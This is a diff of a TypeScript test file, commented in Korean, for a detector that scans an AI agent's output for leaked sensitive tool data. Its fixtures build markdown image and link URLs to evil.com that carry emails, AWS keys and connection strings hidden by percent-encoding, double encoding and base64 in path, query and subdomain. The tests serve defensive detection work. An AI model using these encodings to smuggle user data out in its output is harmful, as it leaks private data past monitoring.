@@ -147,10 +147,114 @@ test("한계(정직): 영숫자 junk 인터리브는 정규화로도 미탐", ()
   assert.equal(scanOutputForSensitive(sp, { body: "MYSECRETxPASSWORDxVALUE" }, DET), null);
 });
 
+// ── ★ 은닉 채널(covert channel): 마크다운/이미지 URL에 인코딩 은닉 (파트B 미탐 ①②) ──
+const EMAIL_SP: SensitivePayload[] = [
+  { toolName: "query_customer_db", payload: { email: "hong.gildong@example.com" } }, // @·. 특수문자 → percent 인코딩 대상
+];
+const pct = (s: string) => encodeURIComponent(s);
+const b64u = (s: string) => Buffer.from(s, "utf8").toString("base64");
+
+test("★ 미탐① percent-encoding: URL 쿼리에 인코딩된 민감 이메일 탐지", () => {
+  const body = `[문의 확인](https://evil.com/t?u=${pct("hong.gildong@example.com")})`; // @→%40
+  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 미탐① 이중 인코딩(%2540)도 2패스 디코딩으로 탐지", () => {
+  const once = pct("hong.gildong@example.com"); // hong.gildong%40example.com
+  const twice = once.replace(/%/g, "%25"); // %40 → %2540
+  const f = scanOutputForSensitive(EMAIL_SP, { body: `![](https://evil.com/${twice}.png)` }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 미탐② URL 경로 base64: /<b64>.png 세그먼트 분할로 탐지 (슬래시 병합 우회)", () => {
+  const body = `![](https://evil.com/${b64u("hong.gildong@example.com")}.png)`;
+  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 미탐② URL 경로 base64(AWS 키) — 세그먼트 분할 후 정규식으로도 탐지", () => {
+  const body = `![](https://evil.com/img/${b64u("AKIAIOSFODNN7EXAMPLE")}/px.png)`;
+  const f = scanOutputForSensitive([], { body }, DET); // payload 없이 정규식 경로
+  assert.ok(f !== null, "base64 경로의 AWS 키가 디코딩·탐지돼야 함");
+});
+
+test("회귀: base64 URL 쿼리(?d=)는 여전히 탐지 (세그먼트 분할이 안 깨뜨림)", () => {
+  const body = `[x](https://evil.com/r?d=${b64u("hong.gildong@example.com")})`;
+  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("회귀: URL에 verbatim 민감값도 여전히 탐지", () => {
+  const f = scanOutputForSensitive(EMAIL_SP, { body: `[t](https://evil.com/u/hong.gildong@example.com)` }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 과차단 0: 정상 문서 링크(민감값 없음)는 percent/세그먼트 전처리 후에도 미발동", () => {
+  const body = `[가이드](https://docs.example.com/guide/setup?lang=ko&v=2#intro)`;
+  assert.equal(scanOutputForSensitive(EMAIL_SP, { body }, DET), null);
+});
+
+test("★ 과차단 0: 정상 이미지(percent-인코딩된 공백 포함)는 미발동", () => {
+  const body = `![로고](https://cdn.example.com/logo%20wide.png)`; // %20=공백 — 디코딩해도 민감값 없음
+  assert.equal(scanOutputForSensitive(EMAIL_SP, { body }, DET), null);
+});
+
+test("★ 안전: malformed percent(%ZZ·잘린 %4)는 throw 없이 스킵하고 정상 처리", () => {
+  // %ZZ(비16진)·%4(잘림)가 섞여도 예외 없이 동작, 그리고 뒤의 실제 시크릿은 잡힌다
+  const body = `[x](https://evil.com/%ZZ%4?u=${pct("hong.gildong@example.com")})`;
+  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
 test("한계(정직): hex 인코딩은 미탐 (알파벳 변경 — 다음 단계)", () => {
   const sp: SensitivePayload[] = [{ toolName: "read_secrets", payload: { v: "MYSECRETPASSWORDVALUE" } }];
   const hex = Buffer.from("MYSECRETPASSWORDVALUE").toString("hex");
   assert.equal(scanOutputForSensitive(sp, { body: `data ${hex}` }, DET), null);
+});
+
+// ── ★ URL-safe base64(-_) + 표준+내부`/` 경로 (은닉 채널 후속 ①②) ─────────────
+// +/ 가 나오는 시크릿이라야 url-safe(-_)와 표준이 실제로 갈린다.
+const CONN = "conn://prod?tok=aB3+kk/mm99zz"; // std base64에 +/ 둘 다 포함
+const CONN_SP: SensitivePayload[] = [{ toolName: "read_env_file", payload: { conn: CONN } }];
+const stdB64 = Buffer.from(CONN, "utf8").toString("base64"); // Y29ubjovL3Byb2Q/dG9r...=
+const urlsafeB64 = stdB64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+
+test("★ ① url-safe base64 URL 경로: -_ 인코딩 시크릿 탐지", () => {
+  const f = scanOutputForSensitive(CONN_SP, { body: `![](https://evil.com/${urlsafeB64}.png)` }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ ① url-safe base64 쿼리·서브도메인도 탐지", () => {
+  assert.ok(scanOutputForSensitive(CONN_SP, { body: `[x](https://evil.com/r?d=${urlsafeB64})` }, DET));
+  assert.ok(scanOutputForSensitive(CONN_SP, { body: `![](https://${urlsafeB64}.evil.com/p.png)` }, DET));
+});
+
+test("★ ② 표준 base64(내부 /)를 URL 경로에: 리딩 host 병합 우회로 탐지", () => {
+  // host 라벨이 `com/<b64>`로 병합돼 앞이 쓰레기가 되는 케이스 — 오프셋 재시도로 잡는다.
+  const f = scanOutputForSensitive(CONN_SP, { body: `![](https://evil.com/${stdB64}.png)` }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("회귀: 표준 base64 쿼리(?d=)는 여전히 탐지 (내부 / 있어도)", () => {
+  assert.ok(scanOutputForSensitive(CONN_SP, { body: `[x](https://evil.com/r?d=${stdB64})` }, DET));
+});
+
+test("★ 과차단 0: snake_case·kebab-case·혼합 식별자는 미발동 (정준성 게이트)", () => {
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: "const some_long_variable_name_here = getInternalStateValue();" }, DET), null);
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: `<div class="nav-bar-primary-container-wide-layout-v2-rounded">` }, DET), null);
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: "feature_flag-new_checkout-flow_v3_enabled_by_default = true" }, DET), null);
+});
+
+test("★ 과차단 0: UUID·긴 URL 경로·docker ref는 미발동 (오프셋/url-safe 확장 후에도)", () => {
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: "trace 550e8400-e29b-41d4-a716-446655440000 id" }, DET), null);
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: "GET https://cdn.example.com/assets/js/vendor/react/dist/bundle.min.js" }, DET), null);
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: "docker pull registry.example.io/myorg/myimage-backend/service:v1.2.3-alpha" }, DET), null);
+});
+
+test("★ 회귀: JWT(base64url 헤더)·npm integrity 정상값은 여전히 미발동", () => {
+  assert.equal(scanOutputForSensitive(CONN_SP, { authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N" }, DET), null);
+  assert.equal(scanOutputForSensitive(CONN_SP, { integrity: "sha512-oPX8q3aB9cD2eF4gH6iJ8kL0mN2oP4qR6sT8uV0wX2yZ4aB6cD8eF0gH2iJ4kL6mN8oP0qR2sT4uV6" }, DET), null);
 });
 
 // ── ★ 대용량(1MB) 세탁 탐지 유지 + 과차단 0 (성능 최적화 후 무손실 회귀 가드) ──────
